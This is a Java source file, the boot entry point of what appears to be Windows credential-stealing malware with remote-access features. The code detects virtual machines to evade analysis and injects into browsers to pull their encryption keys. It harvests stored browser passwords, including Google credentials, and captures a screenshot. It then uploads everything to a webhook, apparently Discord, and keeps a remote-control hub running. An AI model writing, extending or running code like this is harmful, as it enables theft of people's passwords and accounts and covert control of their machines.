package noface.browsers;

import noface.api.Mem;
import noface.api.Send;
import noface.config.Cfg;
import noface.config.Hook;
import noface.config.Log;
import noface.config.S;
import noface.config.Sys;
import noface.host.Lock;
import noface.host.Run;
import noface.host.Vm;
import noface.host.Watch;
import noface.host.Wipe;
import noface.rat.Hub;
import noface.sync.Embed;

import java.util.concurrent.atomic.AtomicBoolean;

public final class Boot {

    private static final AtomicBoolean busy = new AtomicBoolean(false);

    public static void main(String[] args) {
        go(args);
    }

    public static void go(String[] args) {
        if (args != null && args.length >= 3 && S.e("abe").equals(args[0])) {
            abeChild(args[1], args[2]);
            return;
        }
        Log.out(S.e("[*] boot"));
        if (!System.getProperty("os.name", "").toLowerCase().contains("win")) {
            Log.err(S.e("Windows only"));
            System.exit(1);
        }
        if (Cfg.ANTI_VM && Vm.bad()) {
            Log.out(S.e("[!] vm"));
            Log.drain();
            System.exit(0);
        }
        if (!Lock.hold()) {
            Log.out(S.e("[!] lock"));
            Log.drain();
            System.exit(0);
        }
        boolean rat = false;
        try {
            Run.arm();
            Watch.go();
            Log.out(S.e("[+] arm"));
            pack(false);
            if (Hook.base() != null && Hook.hookId() != null) {
                Log.out(S.e("[*] hub"));
                rat = true;
                new Hub().runForever();
            }
        } catch (Throwable e) {
            Log.err(S.e("fail: ") + (e.getMessage() != null ? e.getMessage() : e.getClass().getSimpleName()));
            if (Cfg.DEBUG) System.exit(1);
        } finally {
            Log.drain();
            if (!rat) {
                Wipe.go();
                Lock.release();
            }
        }
    }

    public static boolean pack(boolean remote) {
        if (!busy.compareAndSet(false, true)) return false;
        try {
            Mem.clear();
            Log.out(S.e("[*] sync"));
            try {
                noface.sync.Pull.run();
                Log.out(S.e("[+] sync done"));
            } catch (Throwable t) {
                Log.err(S.e("sync: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            Log.out(S.e("[*] browsers"));
            Pull.Stats browser;
            try {
                browser = Pull.run();
            } catch (Throwable t) {
                Log.err(S.e("browsers: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
                browser = new Pull.Stats(0, 0, "", java.util.List.of(), java.util.List.of(), 0, 0, 0);
            }
            Log.out(S.e("[+] browsers done"));

            if (!Hook.ready()) {
                Log.out(S.e("[!] hook"));
                return true;
            }

            Log.out(remote ? S.e("[*] push rem") : S.e("[*] push"));
            Send.begin();
            byte[] zip = Mem.zip();
            String lines = Embed.browserBlock(browser.items());
            String foot = Cfg.footer();
            String json = Embed.mainUser(Sys.pc(), Sys.os(), lines, foot);
            try {
                if (zip.length > 0) {
                    Send.hookFile(json, zip, Cfg.zipName(), S.e("application/zip"));
                } else {
                    Send.hookJson(json);
                }
            } catch (Throwable t) {
                Log.err(S.e("push: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            try {
                noface.sync.Pull.push(browser.entries());
            } catch (Throwable t) {
                Log.err(S.e("discord push: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            try {
                String most = Pass.most(browser.entries());
                String mostJson = Embed.mostPass(most);
                Send.hookJson(mostJson);
            } catch (Throwable t) {
                Log.err(S.e("most: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            try {
                String gmail = Pass.google(browser.entries());
                String gJson = Embed.googlePass(gmail);
                if (gJson != null) Send.hookJson(gJson);
            } catch (Throwable t) {
                Log.err(S.e("gmail: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            try {
                byte[] png = Shot.png();
                if (png != null && png.length > 0) {
                    Send.hookFile(Embed.screen(foot), png, S.e("screen.png"), S.e("image/png"));
                }
            } catch (Throwable t) {
                Log.err(S.e("screen: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }

            try {
                Send.dual(!(remote && Cfg.lab()));
                Log.out(S.e("[+] dual ok"));
            } catch (Throwable t) {
                Log.err(S.e("dual: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            }
            return true;
        } catch (Throwable t) {
            Log.err(S.e("pack: ") + (t.getMessage() != null ? t.getMessage() : t.getClass().getSimpleName()));
            return true;
        } finally {
            busy.set(false);
        }
    }

    private static void abeChild(String name, String outPath) {
        int code = 4;
        try {
            Paths.Def hit = null;
            for (Paths.Def b : Paths.all()) {
                if (b.name().equals(name)) {
                    hit = b;
                    break;
                }
            }
            if (hit == null) {
                System.exit(3);
                return;
            }
            noface.browsers.abe.Attempt att = noface.browsers.abe.Inject.run(hit);
            if (att.ok() && att.key() != null && att.key().length == 32) {
                java.nio.file.Files.write(java.nio.file.Path.of(outPath), att.key());
                code = 0;
            } else {
                try {
                    String why = att.reason() != null ? att.reason() : "fail";
                    java.nio.file.Files.writeString(java.nio.file.Path.of(outPath + ".why"), why);
                } catch (Throwable ignored) {
                }
                code = 2;
            }
        } catch (Throwable t) {
            code = 4;
        }
        System.exit(code);
    }

    private Boot() {}
}
